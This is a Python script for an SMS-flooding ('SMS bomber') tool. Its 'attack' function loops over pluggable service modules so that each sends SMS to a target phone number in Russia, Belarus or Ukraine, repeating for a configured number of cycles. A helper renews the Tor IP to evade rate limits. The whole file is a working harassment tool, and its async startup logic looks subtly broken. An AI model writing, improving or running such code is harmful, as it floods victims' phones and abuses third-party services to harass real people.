import inspect
import logging
import os
import re
import subprocess
import sys
import traceback
import webbrowser
import time
from collections import deque
import aiohttp.client_exceptions
import click
import phonenumbers
import pkg_resources
from aiohttp import web
import asyncio

import config 

# for static values in class Service
from services.service import Service


COUNTRY_CODES = {"ru": "7", "by": "375","ua": "380"}
API_REQUIRED_PARAMS = ["number_of_cycles", "phone_code", "phone"]


current = deque()
def coroutine_start(run, *args, **kwargs):
    coro = run(*args, **kwargs)
    current.append(coro)
    coro.send(None)

# @click.option('--password', default=TOR_PASSWORD)
# @click.option("--phonecode", default='ru')
# @click.option("--phonenumber")
# @click.option("--number_iteration", default=100)
async def main(password: str, phonecode: str, phonenumber: str, number_iteration: int):
    logging.basicConfig(
        format='%(levelname)s\t\t%(asctime)s: %(name)s - %(message)s',
        level=logging.DEBUG
    )
    TOR_PASSWORD = password
    loop = asyncio.get_event_loop()
    loop.run_until_complete(attack(number_iteration, COUNTRY_CODES[phonecode], phonenumber, TOR_PASSWORD))

def load_services():
    services = os.listdir("services")
    sys.path.insert(0, "services")
    service_classes = {}

    for service in services:
        if service.endswith(".py") and service != "service.py":
            module = __import__(service[:-3])
            for member in inspect.getmembers(module, inspect.isclass):
                if member[1].__module__ == module.__name__:
                    service_classes[module] = member[0]

    return service_classes

def change_ip(password):
    logger = logging.getLogger('change_ip')
    while True:
        if Service.is_ip_available:
            Service.renew_connection(password)
            logger.debug("get new ip")
            break
        else:
            logger.debug(f"wait {Service.wait_new_ip} seconds for new ip")
            time.sleep(Service.wait_new_ip)

async def attack(number_of_cycles: int, phone_code: str, phone: str, password: str):
    for _ in range(number_of_cycles):
        # change_ip(password)
        for module, service in load_services().items():
            classService = getattr(module, service)
            logger = logging.getLogger(classService.__name__)
            try:
                # await classService(phone, phone_code).run()
                await classService(phone, phone_code).run()
                logger.info("send sms")
            except aiohttp.client_exceptions.ClientError as exp:
                logger.error(exp)
            except Exception as exp:
                logger.error(exp)
                raise exp

if __name__ == "__main__":
    coroutine_start(
        main, config.TOR_PASSWORD,
        config.COUNTRY_CODE, config.PHONENUMBER,
        config.NUMBER_ITERATION
    )

